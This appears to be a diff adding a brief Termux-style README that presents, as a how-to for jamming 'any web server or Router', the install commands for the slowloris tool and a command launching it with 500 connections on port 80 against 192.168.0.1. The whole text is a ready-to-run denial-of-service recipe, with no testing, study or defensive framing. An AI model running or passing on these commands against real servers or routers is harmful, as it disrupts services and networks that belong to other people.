@@ -1,0 +1,16 @@
+# Slowloris
+How to jam any web server or Router By Slowloris Attack.
+
+pkg update -y
+
+pkg upgrade -y
+
+pkg install python
+
+pip install slowloris
+
+slowloris
+
+slowloris -s 500 -p 80 192.168.0.1 -v
+
+💪
